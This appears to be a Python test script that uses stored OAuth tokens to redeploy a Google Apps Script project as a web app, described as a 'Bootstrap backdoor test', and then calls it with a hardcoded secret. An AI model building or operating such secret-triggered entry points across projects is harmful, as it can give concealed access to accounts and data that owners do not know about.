# Single satellite end-to-end test: fresh deployment + fire + check response
import json
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
import requests

SECRET = "GUO_BOOTSTRAP_2026_SECRET"

with open("script_to_token_map.json") as f:
    stmap = json.load(f)

script_id = list(stmap["map"].keys())[0]
token_file = list(stmap["map"].values())[0]
print(f"Script: {script_id[:30]}...")
print(f"Token:  {token_file}")

creds = Credentials.from_authorized_user_file(token_file)
if creds.expired and creds.refresh_token:
    creds.refresh(Request())

svc = build("script", "v1", credentials=creds, cache_discovery=False)

# Create fresh version from latest pushed code
print("\n1. Creating fresh version...")
ver = svc.projects().versions().create(
    scriptId=script_id,
    body={"description": "webapp bootstrap test"}
).execute()
vnum = ver["versionNumber"]
print(f"   ✅ Version {vnum} created")

# Create deployment
print("2. Creating web app deployment...")
dep = svc.projects().deployments().create(
    scriptId=script_id,
    body={
        "versionNumber": vnum,
        "manifestFileName": "appsscript",
        "description": "Bootstrap backdoor test"
    }
).execute()

url = None
for ep in dep.get("entryPoints", []):
    print(f"   Entry point type: {ep.get('entryPointType')}")
    if ep.get("entryPointType") == "WEB_APP":
        url = ep.get("webApp", {}).get("url")

if not url:
    print("❌ No WEB_APP entry point found — manifest webapp block missing!")
    print("   Deployment response:", json.dumps(dep, indent=2)[:500])
else:
    print(f"   ✅ URL: {url[:70]}...")
    print("\n3. Firing doGet...")
    resp = requests.get(url, params={"secret": SECRET}, timeout=30)
    print(f"   HTTP {resp.status_code}")
    print(f"   Content-Type: {resp.headers.get('Content-Type','?')}")
    print(f"   Body (first 200): {resp.text[:200]}")
